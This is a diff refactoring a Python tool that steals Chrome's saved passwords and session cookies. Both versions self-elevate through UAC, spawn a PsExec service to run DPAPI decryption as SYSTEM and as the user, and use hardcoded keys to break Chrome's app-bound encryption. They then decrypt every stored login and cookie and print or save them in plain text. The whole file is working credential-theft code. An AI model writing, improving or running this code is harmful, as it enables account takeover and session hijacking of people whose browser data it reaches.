@@ -1,411 +1,291 @@
-#!/usr/bin/env python3
-"""
-Chrome Password Extractor - Recovers passwords and cookies from Chrome browser
-Requires admin privileges to access protected data
-"""
 import ctypes
 import sys
 import os
 import json
-import binascii
 import time
-import sqlite3
-import pathlib
+import binascii
 import argparse
 import logging
+import csv
 from datetime import datetime
-from typing import List, Tuple, Dict, Optional, Any
+from Crypto.Cipher import AES, ChaCha20_Poly1305
+import sqlite3
+import pathlib
+from pypsexec.client import Client
+from smbprotocol.exceptions import SMBResponseException
 
-# Set up logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.StreamHandler(sys.stdout)
-    ]
-)
-logger = logging.getLogger(__name__)
+def setup_logging(verbose):
+    """Configure logging based on verbosity."""
+    level = logging.DEBUG if verbose else logging.INFO
+    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Check for required modules
-try:
-    from pypsexec.client import Client
-    from Crypto.Cipher import AES, ChaCha20_Poly1305
-    from smbprotocol.exceptions import SMBResponseException
-except ImportError as e:
-    logger.error(f"Missing required module: {e}")
-    logger.error("Please install required packages: pip install pypsexec pycryptodome")
-    sys.exit(1)
-
-def is_admin() -> bool:
+def is_admin():
     """Check if the script is running with administrator privileges."""
     try:
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except Exception as e:
-        logger.error(f"Failed to check admin status: {e}")
+        logging.error(f"Failed to check admin privileges: {e}")
         return False
 
-def parse_arguments():
-    """Parse command line arguments."""
-    parser = argparse.ArgumentParser(description="Chrome Password and Cookie Extractor")
-    parser.add_argument("-o", "--output", choices=["console", "json", "csv"], default="console",
-                        help="Output format (default: console)")
-    parser.add_argument("-f", "--file", type=str, help="Output file name (default: chrome_data_YYYY-MM-DD.ext)")
-    parser.add_argument("--no-cookies", action="store_true", help="Skip cookie extraction")
-    parser.add_argument("--no-passwords", action="store_true", help="Skip password extraction")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
-    return parser.parse_args()
+def elevate_privileges():
+    """Relaunch the script with administrator privileges."""
+    logging.info("Script requires administrator privileges. Attempting to relaunch...")
+    try:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([sys.argv[0]] + sys.argv[1:]), None, 1)
+        sys.exit(0)
+    except Exception as e:
+        logging.error(f"Failed to elevate privileges: {e}")
+        sys.exit(1)
 
-def get_chrome_paths() -> Dict[str, str]:
-    """Get paths to Chrome data files."""
+def get_encryption_key():
+    """Retrieve and decrypt the Chrome encryption key."""
     user_profile = os.environ.get('USERPROFILE')
     if not user_profile:
-        raise EnvironmentError("Could not determine user profile directory")
-    
-    return {
-        "local_state": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"),
-        "cookies": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
-        "passwords": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-    }
+        logging.error("USERPROFILE environment variable not found.")
+        sys.exit(1)
 
-def decrypt_key_with_dpapi(client: Client, encrypted_key: str) -> bytes:
-    """Decrypt the Chrome encryption key using DPAPI via PSExec."""
+    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
+    try:
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+    except (FileNotFoundError, json.JSONDecodeError) as e:
+        logging.error(f"Failed to read Local State file: {e}")
+        sys.exit(1)
+
+    app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
+    if not app_bound_encrypted_key:
+        logging.error("App-bound encrypted key not found in Local State.")
+        sys.exit(1)
+
     arguments = "-c \"" + """import win32crypt
 import binascii
 encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
 print(binascii.b2a_base64(encrypted_key[1]).decode())
 """.replace("\n", ";") + "\""
 
-    # Step 1: Decrypt with SYSTEM DPAPI
-    logger.debug("Decrypting key with SYSTEM DPAPI")
-    encrypted_key_b64, stderr, rc = client.run_executable(
-        sys.executable,
-        arguments=arguments.format(encrypted_key),
-        use_system_account=True
-    )
-    
-    if rc != 0:
-        raise RuntimeError(f"System DPAPI decryption failed with error code {rc}: {stderr.decode() if stderr else 'Unknown error'}")
-    
-    # Step 2: Decrypt with user DPAPI
-    logger.debug("Decrypting key with user DPAPI")
-    decrypted_key_b64, stderr, rc = client.run_executable(
-        sys.executable,
-        arguments=arguments.format(encrypted_key_b64.decode().strip()),
-        use_system_account=False
-    )
-    
-    if rc != 0:
-        raise RuntimeError(f"User DPAPI decryption failed with error code {rc}: {stderr.decode() if stderr else 'Unknown error'}")
-    
-    # Return the relevant part of the key
-    return binascii.a2b_base64(decrypted_key_b64)[-61:]
+    c = Client("localhost")
+    try:
+        c.connect()
+        c.create_service()
 
-def decrypt_master_key(encrypted_key_data: bytes) -> bytes:
-    """Decrypt the master key using either AES or ChaCha20."""
-    # Keys from elevation_service.exe
+        if binascii.a2b_base64(app_bound_encrypted_key)[:4] != b"APPB":
+            logging.error("Invalid app-bound encrypted key format.")
+            sys.exit(1)
+
+        app_bound_encrypted_key_b64 = binascii.b2a_base64(
+            binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
+
+        # Decrypt with SYSTEM DPAPI
+        encrypted_key_b64, stderr, rc = c.run_executable(
+            sys.executable, arguments=arguments.format(app_bound_encrypted_key_b64), use_system_account=True
+        )
+        if rc != 0:
+            logging.error(f"SYSTEM DPAPI decryption failed: {stderr.decode()}")
+            sys.exit(1)
+
+        # Decrypt with user DPAPI
+        decrypted_key_b64, stderr, rc = c.run_executable(
+            sys.executable, arguments=arguments.format(encrypted_key_b64.decode().strip()), use_system_account=False
+        )
+        if rc != 0:
+            logging.error(f"User DPAPI decryption failed: {stderr.decode()}")
+            sys.exit(1)
+
+        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
+    except Exception as e:
+        logging.error(f"Error during key decryption process: {e}")
+        sys.exit(1)
+    finally:
+        for _ in range(3):
+            try:
+                c.remove_service()
+                break
+            except SMBResponseException as e:
+                if "STATUS_CANNOT_DELETE" in str(e):
+                    logging.warning(f"Failed to remove service: {e}. Retrying...")
+                    time.sleep(1)
+                else:
+                    logging.error(f"Failed to remove service: {e}")
+                    sys.exit(1)
+            except Exception as e:
+                logging.error(f"Unexpected error during service removal: {e}")
+                sys.exit(1)
+        else:
+            logging.warning("Failed to remove service after retries. Manual cleanup may be required.")
+        c.disconnect()
+
+    # Decrypt key with AES256GCM or ChaCha20Poly1305
     aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
     chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
-    
-    # Parse the key components
-    flag = encrypted_key_data[0]
-    iv = encrypted_key_data[1:1+12]
-    ciphertext = encrypted_key_data[1+12:1+12+32]
-    tag = encrypted_key_data[1+12+32:]
-    
+
+    flag = decrypted_key[0]
+    iv = decrypted_key[1:1+12]
+    ciphertext = decrypted_key[1+12:1+12+32]
+    tag = decrypted_key[1+12+32:]
+
     try:
         if flag == 1:
-            logger.debug("Using AES-GCM for key decryption")
             cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
         elif flag == 2:
-            logger.debug("Using ChaCha20-Poly1305 for key decryption")
             cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
         else:
-            raise ValueError(f"Unsupported encryption flag: {flag}")
-        
-        return cipher.decrypt_and_verify(ciphertext, tag)
-    except Exception as e:
-        logger.error(f"Failed to decrypt master key: {e}")
-        raise
+            logging.error(f"Unsupported encryption flag: {flag}")
+            sys.exit(1)
+        key = cipher.decrypt_and_verify(ciphertext, tag)
+    except ValueError as e:
+        logging.error(f"Key decryption failed: {e}")
+        sys.exit(1)
 
-def decrypt_chrome_data(encrypted_value: bytes, key: bytes) -> str:
-    """Decrypt Chrome v20 encrypted data."""
-    if not encrypted_value.startswith(b"v20"):
-        raise ValueError("Only v20 encrypted values are supported")
-    
-    iv = encrypted_value[3:3+12]
-    encrypted_data = encrypted_value[3+12:-16]
-    tag = encrypted_value[-16:]
-    
-    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
-    decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
-    
-    # For passwords, we don't need to skip bytes; for cookies, we skip 32 bytes
-    if len(decrypted_data) > 32 and all(b == 0 for b in decrypted_data[:16]):
-        return decrypted_data[32:].decode('utf-8')
-    return decrypted_data.decode('utf-8')
+    return key
 
-def get_cookies(db_path: str, key: bytes) -> List[Dict[str, Any]]:
-    """Extract and decrypt cookies from the Chrome database."""
-    logger.info("Extracting cookies from database...")
-    
-    cookies = []
+def decrypt_v20(encrypted_value, key, data_type="data"):
+    """Decrypt v20 encrypted data (cookie or password) using AES256GCM."""
     try:
-        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
-        conn.row_factory = sqlite3.Row
-        cursor = conn.cursor()
-        
-        query = """
-        SELECT host_key, name, path, expires_utc, is_secure, 
-               is_httponly, CAST(encrypted_value AS BLOB) as encrypted_value
-        FROM cookies
-        """
-        cursor.execute(query)
-        
-        for row in cursor.fetchall():
-            if not row['encrypted_value'].startswith(b"v20"):
-                continue
-                
-            try:
-                decrypted_value = decrypt_chrome_data(row['encrypted_value'], key)
-                cookies.append({
-                    'host': row['host_key'],
-                    'name': row['name'],
-                    'path': row['path'],
-                    'value': decrypted_value,
-                    'expires': row['expires_utc'],
-                    'secure': bool(row['is_secure']),
-                    'httponly': bool(row['is_httponly'])
-                })
-            except Exception as e:
-                logger.debug(f"Failed to decrypt cookie {row['name']} for {row['host_key']}: {e}")
-        
-        conn.close()
-        logger.info(f"Successfully extracted {len(cookies)} cookies")
-        return cookies
-    
-    except Exception as e:
-        logger.error(f"Error extracting cookies: {e}")
+        iv = encrypted_value[3:3+12]
+        encrypted_data = encrypted_value[3+12:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+        decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
+        if data_type == "cookie":
+            return decrypted_data[32:].decode('utf-8')
+        return decrypted_data.decode('utf-8')
+    except ValueError as e:
+        logging.warning(f"Failed to decrypt {data_type}: {e}")
+        return None
+
+def fetch_cookies():
+    """Fetch v20 cookies from Chrome's Cookies database."""
+    user_profile = os.environ.get('USERPROFILE')
+    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+    try:
+        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
+        cur = con.cursor()
+        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;")
+        cookies = cur.fetchall()
+        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
+        con.close()
+        return cookies_v20
+    except sqlite3.Error as e:
+        logging.error(f"Failed to fetch cookies: {e}")
         return []
 
-def get_passwords(db_path: str, key: bytes) -> List[Dict[str, Any]]:
-    """Extract and decrypt passwords from the Chrome database."""
-    logger.info("Extracting passwords from database...")
-    
-    passwords = []
+def fetch_passwords():
+    """Fetch v20 passwords from Chrome's Login Data database."""
+    user_profile = os.environ.get('USERPROFILE')
+    password_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
     try:
-        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
-        conn.row_factory = sqlite3.Row
-        cursor = conn.cursor()
-        
-        query = """
-        SELECT origin_url, action_url, username_element, username_value, 
-               password_element, CAST(password_value AS BLOB) as password_value,
-               date_created, date_last_used, times_used
-        FROM logins
-        """
-        cursor.execute(query)
-        
-        for row in cursor.fetchall():
-            if not row['password_value'].startswith(b"v20"):
-                continue
-                
-            try:
-                decrypted_password = decrypt_chrome_data(row['password_value'], key)
-                passwords.append({
-                    'url': row['origin_url'],
-                    'action_url': row['action_url'],
-                    'username_field': row['username_element'],
-                    'username': row['username_value'],
-                    'password_field': row['password_element'],
-                    'password': decrypted_password,
-                    'created': row['date_created'],
-                    'last_used': row['date_last_used'],
-                    'times_used': row['times_used']
-                })
-            except Exception as e:
-                logger.debug(f"Failed to decrypt password for {row['origin_url']}: {e}")
-        
-        conn.close()
-        logger.info(f"Successfully extracted {len(passwords)} passwords")
-        return passwords
-    
-    except Exception as e:
-        logger.error(f"Error extracting passwords: {e}")
+        con = sqlite3.connect(pathlib.Path(password_db_path).as_uri() + "?mode=ro", uri=True)
+        cur = con.cursor()
+        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
+        passwords = cur.fetchall()
+        passwords_v20 = [p for p in passwords if p[2][:3] == b"v20"]
+        con.close()
+        return passwords_v20
+    except sqlite3.Error as e:
+        logging.error(f"Failed to fetch passwords: {e}")
         return []
 
-def format_and_save_output(cookies: List[Dict], passwords: List[Dict], output_format: str, output_file: Optional[str]):
-    """Format and save the extracted data in the specified format."""
-    if output_format == "console":
-        # Print to console in a readable format
-        if cookies:
-            print("\n===== COOKIES =====")
-            for i, cookie in enumerate(cookies, 1):
-                print(f"\n[{i}] {cookie['host']}")
-                print(f"  Name: {cookie['name']}")
-                print(f"  Value: {cookie['value']}")
-                print(f"  Path: {cookie['path']}")
-                print(f"  Secure: {cookie['secure']}")
-                print(f"  HttpOnly: {cookie['httponly']}")
-        
-        if passwords:
-            print("\n===== PASSWORDS =====")
-            for i, pwd in enumerate(passwords, 1):
-                print(f"\n[{i}] {pwd['url']}")
-                print(f"  Username: {pwd['username']}")
-                print(f"  Password: {pwd['password']}")
-                print(f"  Action URL: {pwd['action_url']}")
-                if pwd['last_used']:
-                    print(f"  Last Used: {datetime.fromtimestamp(pwd['last_used'] / 1000000 - 11644473600)}")
-        
-        return
+def output_data(cookies, passwords, output_format, output_file, key):
+    """Output decrypted cookies and passwords in the specified format."""
+    cookie_data = [
+        {"host_key": c[0], "name": c[1], "value": decrypt_v20(c[2], key, "cookie")}
+        for c in cookies
+        if decrypt_v20(c[2], key, "cookie") is not None
+    ]
+    password_data = [
+        {"origin_url": p[0], "username": p[1], "password": decrypt_v20(p[2], key, "password")}
+        for p in passwords
+        if decrypt_v20(p[2], key, "password") is not None
+    ]
 
-    # Prepare filename if not provided
-    if not output_file:
-        timestamp = datetime.now().strftime("%Y-%m-%d")
-        output_file = f"chrome_data_{timestamp}.{output_format}"
-    
-    data = {
-        "cookies": cookies,
-        "passwords": passwords,
-        "extracted_at": datetime.now().isoformat()
-    }
-    
-    try:
-        if output_format == "json":
-            import json
-            with open(output_file, 'w', encoding='utf-8') as f:
-                json.dump(data, f, indent=2)
-        
-        elif output_format == "csv":
-            import csv
-            
-            # Write cookies to CSV
-            if cookies:
-                cookies_file = f"cookies_{output_file}"
-                with open(cookies_file, 'w', newline='', encoding='utf-8') as f:
-                    writer = csv.writer(f)
-                    writer.writerow(['Host', 'Name', 'Value', 'Path', 'Secure', 'HttpOnly', 'Expires'])
-                    for cookie in cookies:
-                        writer.writerow([
-                            cookie['host'], cookie['name'], cookie['value'], 
-                            cookie['path'], cookie['secure'], cookie['httponly'], cookie['expires']
-                        ])
-            
-            # Write passwords to CSV
-            if passwords:
-                passwords_file = f"passwords_{output_file}"
-                with open(passwords_file, 'w', newline='', encoding='utf-8') as f:
-                    writer = csv.writer(f)
-                    writer.writerow(['URL', 'Username', 'Password', 'Action URL', 'Created', 'Last Used', 'Times Used'])
-                    for pwd in passwords:
-                        writer.writerow([
-                            pwd['url'], pwd['username'], pwd['password'], pwd['action_url'],
-                            pwd['created'], pwd['last_used'], pwd['times_used']
-                        ])
-        
-        logger.info(f"Data saved to {output_file}")
-    
-    except Exception as e:
-        logger.error(f"Failed to save output: {e}")
+    if output_format == "json":
+        output = {"cookies": cookie_data, "passwords": password_data}
+        if output_file:
+            try:
+                with open(output_file, 'w', encoding='utf-8') as f:
+                    json.dump(output, f, indent=2)
+                logging.info(f"Data written to {output_file}")
+            except IOError as e:
+                logging.error(f"Failed to write JSON file: {e}")
+                sys.exit(1)
+        else:
+            print(json.dumps(output, indent=2))
+    elif output_format == "csv":
+        if output_file:
+            try:
+                with open(output_file, 'w', newline='', encoding='utf-8') as f:
+                    if cookie_data:
+                        writer = csv.DictWriter(f, fieldnames=["host_key", "name", "value"])
+                        writer.writeheader()
+                        writer.writerows(cookie_data)
+                    if password_data:
+                        f.write("\n")
+                        writer = csv.DictWriter(f, fieldnames=["origin_url", "username", "password"])
+                        writer.writeheader()
+                        writer.writerows(password_data)
+                logging.info(f"Data written to {output_file}")
+            except IOError as e:
+                logging.error(f"Failed to write CSV file: {e}")
+                sys.exit(1)
+        else:
+            if cookie_data:
+                writer = csv.DictWriter(sys.stdout, fieldnames=["host_key", "name", "value"])
+                writer.writeheader()
+                writer.writerows(cookie_data)
+            if password_data:
+                print()
+                writer = csv.DictWriter(sys.stdout, fieldnames=["origin_url", "username", "password"])
+                writer.writeheader()
+                writer.writerows(password_data)
+    else:  # console
+        if cookie_data:
+            print("Decrypted Cookies:")
+            for c in cookie_data:
+                print(f"{c['host_key']} {c['name']} {c['value']}")
+        if password_data:
+            print("\nDecrypted Passwords:")
+            for p in password_data:
+                print(f"{p['origin_url']} {p['username']} {p['password']}")
 
 def main():
-    """Main function to run the Chrome data extraction process."""
-    args = parse_arguments()
-    
-    # Set logging level based on verbosity
-    if args.verbose:
-        logger.setLevel(logging.DEBUG)
-    
-    # Check for admin privileges
+    """Main function to orchestrate the script execution."""
+    parser = argparse.ArgumentParser(description="Extract and decrypt Chrome cookies and passwords.")
+    parser.add_argument("-o", "--output", choices=["console", "json", "csv"], default="console",
+                        help="Output format (default: console)")
+    parser.add_argument("-f", "--file", help="Output file name (default: chrome_data_YYYY-MM-DD.ext)")
+    parser.add_argument("--no-cookies", action="store_true", help="Skip cookie extraction")
+    parser.add_argument("--no-passwords", action="store_true", help="Skip password extraction")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
+
+    args = parser.parse_args()
+    setup_logging(args.verbose)
+
     if not is_admin():
-        logger.error("This script requires administrator privileges.")
-        logger.error("Please run this script with admin privileges and try again.")
-        sys.exit(1)
-    
-    logger.info("Starting Chrome data extraction")
-    
-    try:
-        paths = get_chrome_paths()
-        
-        # Check if Chrome data files exist
-        for name, path in paths.items():
-            if not os.path.exists(path):
-                logger.error(f"Chrome {name} file not found at: {path}")
-                logger.error("Make sure Chrome is installed and has been run at least once.")
-                sys.exit(1)
-        
-        # Read and parse the local state file to get the encrypted key
-        with open(paths["local_state"], "r", encoding="utf-8") as f:
-            local_state = json.load(f)
-        
-        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
-        
-        # Make sure the key has the correct format
-        encrypted_key_data = binascii.a2b_base64(app_bound_encrypted_key)
-        if not encrypted_key_data.startswith(b"APPB"):
-            raise ValueError("Invalid app_bound_encrypted_key format")
-        
-        # Connect to the local system
-        logger.info("Connecting to local system...")
-        client = Client("localhost")
-        client.connect()
-        
-        cookies = []
-        passwords = []
-        
-        try:
-            client.create_service()
-            
-            # Get the encrypted key (removing APPB prefix)
-            app_bound_encrypted_key_b64 = binascii.b2a_base64(encrypted_key_data[4:]).decode().strip()
-            
-            # Decrypt the key using DPAPI
-            decrypted_key_data = decrypt_key_with_dpapi(client, app_bound_encrypted_key_b64)
-            
-            # Decrypt the master key
-            master_key = decrypt_master_key(decrypted_key_data)
-            logger.debug(f"Master key: {binascii.b2a_base64(master_key).decode().strip()}")
-            
-            # Extract cookies if requested
-            if not args.no_cookies:
-                cookies = get_cookies(paths["cookies"], master_key)
-            
-            # Extract passwords if requested
-            if not args.no_passwords:
-                passwords = get_passwords(paths["passwords"], master_key)
-            
-        finally:
-            # Clean up service with retries
-            for attempt in range(3):
-                try:
-                    client.remove_service()
-                    break
-                except SMBResponseException as e:
-                    if "STATUS_CANNOT_DELETE" in str(e) and attempt < 2:
-                        logger.warning(f"Failed to remove service: {e}. Retrying in 1 second...")
-                        time.sleep(1)
-                    else:
-                        logger.error(f"Failed to remove service: {e}")
-                        break
-            
-            client.disconnect()
-        
-        # Format and save the extracted data
-        format_and_save_output(cookies, passwords, args.output, args.file)
-        
-        logger.info("Chrome data extraction completed successfully")
-        
-        # Give the user time to see the results if in console mode
-        if args.output == "console":
-            print("\nPress Enter to exit...", end="")
-            input()
-    
-    except Exception as e:
-        logger.error(f"Error during extraction: {e}")
-        if args.verbose:
-            import traceback
-            traceback.print_exc()
+        elevate_privileges()
+
+    key = get_encryption_key()
+    logging.debug(f"Decrypted key: {binascii.b2a_base64(key).decode().strip()}")
+
+    cookies = [] if args.no_cookies else fetch_cookies()
+    passwords = [] if args.no_passwords else fetch_passwords()
+
+    if not cookies and not passwords:
+        logging.error("No data to process. Exiting.")
         sys.exit(1)
 
+    output_file = args.file
+    if not output_file:
+        ext = {"json": "json", "csv": "csv", "console": "txt"}[args.output]
+        output_file = f"chrome_data_{datetime.now().strftime('%Y-%m-%d')}.{ext}" if args.output != "console" else None
+
+    output_data(cookies, passwords, args.output, output_file, key)
+
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        logging.info("Script interrupted by user.")
+        sys.exit(0)
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
+        sys.exit(1)
